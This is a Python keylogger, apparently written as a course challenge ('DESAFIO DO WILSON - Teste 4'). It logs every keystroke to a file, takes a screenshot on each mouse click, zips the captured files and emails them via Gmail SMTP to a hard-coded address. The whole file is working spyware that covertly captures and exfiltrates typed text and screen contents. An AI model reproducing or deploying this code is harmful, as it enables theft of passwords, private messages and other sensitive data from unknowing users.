from email import encoders
from email.mime.base import MIMEBase
from pynput.mouse import Listener as listaMouser
from pynput.keyboard import Listener as listaTeclado
from datetime import datetime as datahora
import re as regetes, os as sistema , pyautogui as printTela
from zipfile import ZipFile as arquivoZip

from email.message import EmailMessage
import ssl
import smtplib

dataAtualSistema = datahora.now()
data = dataAtualSistema.strftime("%d-%m")
pastaRaiz = sistema.path.expanduser("~") + "/Desktop/" + data + "/"
arquivodeLog = pastaRaiz + "keyLogger.log"

def arquivoLog():
    try:
        sistema.mkdir(pastaRaiz)
    except:
        pass #ingnora

def pressionarTeclado(tecladoPressionado):
    teclado = str(tecladoPressionado)
    teclado = regetes.sub(r'\'','', teclado)
    teclado = regetes.sub(r'Key.space', ' ', teclado)
    teclado = regetes.sub(r'Key.enter', '\n', teclado)
    teclado = regetes.sub(r'Key.tab', '   ',teclado)
    teclado = regetes.sub(r'Key.backspace', 'apagar',teclado)
    teclado = regetes.sub(r'Key.*', '', teclado)
    
    with open(arquivodeLog, 'a') as log:
        if str(teclado)==str("apagar"):
            if sistema.stat(arquivodeLog).st_size != 0:
                teclado =  regetes.sub(r'Key.backspace','',teclado)
                log.seek(0,2)
                ponteiroCaractere = log.tell()
                log.truncate(ponteiroCaractere -1)
        else:
            log.write(teclado)


def tirarPrint(x,y, botao, pressionado):
    try:
        if pressionado:
            print(f"O Mouse clicou em {x}, {y} com {botao}")
            capturaDeTela = printTela.screenshot()
            horario = datahora.now()
            horarioCaptura = str(horario.strftime("%H-%M-%S"))
            print(horarioCaptura)
            capturaDeTela.save(sistema.path.join(pastaRaiz, "capturaDeTela_" + horarioCaptura + ".jpg"))
    except:
        compactador()
        sendEmail('keylogger.zip')

def compactador():
    with arquivoZip('keylogger.zip', 'w') as zip:
        for file in sistema.listdir(pastaRaiz):
            zip.write(sistema.path.join(pastaRaiz, file))

def sendEmail(file):
    
    attachment = open(file, 'rb')
    
    email_sender = '<>'
    email_password = '<>' 
    email_reciver = 'victorestanislau1@gmail.com'
    
    subject = "DESAFIO DO WILSON - Teste 4"
    
    body = """
        Key Loggger
    """
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_reciver
    em['Subject'] = subject
    
    
    att = MIMEBase('application', 'octet-stream')
    att.set_payload(attachment.read())
    encoders.encode_base64(att)
    
    att.add_header('Content-Disposition', f'attachment; filename=keylogger.zip')
    attachment.close()
    em.attach(att)
    
    em.set_content(att)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_reciver, em.as_string())
   

def run():
    try:
        arquivoLog()
        
        tecladoLista = listaTeclado(on_press=pressionarTeclado)
        mouseListar = listaMouser(on_click=tirarPrint)

        tecladoLista.start()
        mouseListar.start()
        tecladoLista.join()
        mouseListar.join()
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    run()